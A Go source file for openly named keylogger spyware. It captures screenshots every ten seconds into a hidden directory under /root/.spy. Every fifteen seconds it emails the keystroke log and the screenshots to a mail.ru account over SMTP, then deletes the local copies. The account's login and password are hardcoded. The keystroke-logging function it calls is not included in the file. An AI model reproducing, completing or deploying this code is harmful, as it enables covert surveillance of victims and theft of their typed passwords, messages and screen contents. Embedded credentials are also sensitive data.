package main

import (
	"fmt"
	"image/png"
	"io/ioutil"
	"log"
	"os"
	"time"

	screenshot "github.com/vova616/screenshot"
	gomail "gopkg.in/gomail.v2"
)

const (
	// Home directory for spy.
	spyhome = "/root/.spy/"
	// Screens directory.
	screensHome = spyhome + "/screens/"
	// log file name.
	logFileName = "file.log"
	// Save photo interval.
	savePhotoInterval = 10
	// Send email interval.
	sendEmailInterval = 15
	// Email login
	emailLogin = "pspyware@mail.ru"
	// Email password
	emailPass = "keylogger11"
	// Need to save screen shots?
	isScreenShot = true
)

// Get file contents as string.
func fileGetContents(filename string) string {
	buf, _ := ioutil.ReadFile(filename)
	return string(buf)
}

// Send email with attachment.
func sendEmailWithAttach(header, body string, attachPathArr []string) {
	m := gomail.NewMessage()
	m.SetHeader("From", emailLogin)
	m.SetHeader("To", emailLogin, emailLogin)
	m.SetAddressHeader("", "", "")
	m.SetHeader("Subject", header)
	m.SetBody("text/html", body)

	for _, attach := range attachPathArr {
		m.Attach(attach)
	}

	d := gomail.NewDialer("smtp.mail.ru", 465, emailLogin, emailPass)

	if err := d.DialAndSend(m); err != nil {
		panic(err)
	}
}

// Send email.
func sendEmail(header, body string) {
	m := gomail.NewMessage()
	m.SetHeader("From", emailLogin)
	m.SetHeader("To", emailLogin, emailLogin)
	m.SetAddressHeader("", "", "")
	m.SetHeader("Subject", header)
	m.SetBody("text/html", body)

	d := gomail.NewDialer("smtp.mail.ru", 465, emailLogin, emailPass)

	if err := d.DialAndSend(m); err != nil {
		panic(err)
	}
}

// Get current date format as DD.MM.YYYY
func getCurrentDate() string {
	return time.Now().Format("02.01.2006")
}

// Get current time format as HH:MM:SS
func getCurrentTime() string {
	return time.Now().Local().Format("15:04:05")
}

// Write "" into file.
func clearFileContents(path string) {
	// open file using READ & WRITE permission
	var file, err = os.OpenFile(path, os.O_RDWR|os.O_TRUNC, 0777)
	if err != nil {
		fmt.Println(err)
	}
	defer file.Close()
	// write some text line-by-line to file
	_, err = file.WriteString("")
	if err != nil {
		fmt.Println(err)
	}
	// save changes
	err = file.Sync()
	if err != nil {
		fmt.Println(err)
	}
}

// Delete all elements in directory (screens directoty)
func clearDirectory(path string) {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		log.Fatal(err)
	}

	for _, file := range files {
		os.Remove(screensHome + file.Name())
	}
}

// Check, is dir is empty
func isEmptyDir(path string) bool {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		log.Fatal(err)
	}
	if len(files) == 0 {
		return true
	}
	return false
}

// Send email every {seconds}
func intervalSendEmail(seconds int) {
	for {
		time.Sleep(time.Duration(seconds) * time.Second)

		filepath := spyhome + logFileName
		subj := "KeyLogger-" + getCurrentTime()
		body := fileGetContents(filepath)

		if body == "" {
			body = "Empty log file."
		}

		// If screens directory is empty
		if isEmptyDir(screensHome) {
			sendEmail(subj, body)
		} else {
			// Send email with screenshots
			files, err := ioutil.ReadDir(screensHome)
			if err != nil {
				log.Fatal(err)
			}
			arr := []string{}
			for _, item := range files {
				if !item.IsDir() {
					arr = append(arr, screensHome+item.Name())
				}
			}
			sendEmailWithAttach(subj, body, arr)
		}

		clearFileContents(filepath)
		clearDirectory(screensHome)
	}
}

// Capture screenshot every {seconds}
func intervalScreenShot(seconds int) {
	for {
		screenName := screensHome + "screen_" + getCurrentDate() + "_" + getCurrentTime() + ".png"
		makeScreenShot(screenName)
		time.Sleep(time.Duration(seconds) * time.Second)
	}
}

// Make screen shot ans save it as
func makeScreenShot(filename string) {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create(filename)
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	f.Close()
}

// Append string to file.
func appendIntoFile(filename, content string) {
	// Chech file exists.
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		// Create file for loggin.
		f, err := os.Create(filename)
		if err != nil {
			panic(err)
		}
		defer f.Close()
	}

	file, err := os.OpenFile(filename, os.O_RDWR|os.O_APPEND, 0777)

	if err != nil {
		panic(err)
	}

	if _, err := file.WriteString(content); err != nil {
		panic(err)
	}

	defer file.Close()
}

func main() {
	// Create home directory for spy.
	if _, err := os.Stat(spyhome); os.IsNotExist(err) {
		os.Mkdir(spyhome, 0777)
	}
	// Create home directory for screens.
	if _, err := os.Stat(screensHome); os.IsNotExist(err) {
		os.Mkdir(screensHome, 0777)
	}

	if isScreenShot {
		// Set screen shot interval.
		go intervalScreenShot(savePhotoInterval)
	}

	go intervalSendEmail(sendEmailInterval)

	filename := spyhome + logFileName
	LogKeys(filename)
	os.Exit(0)
}
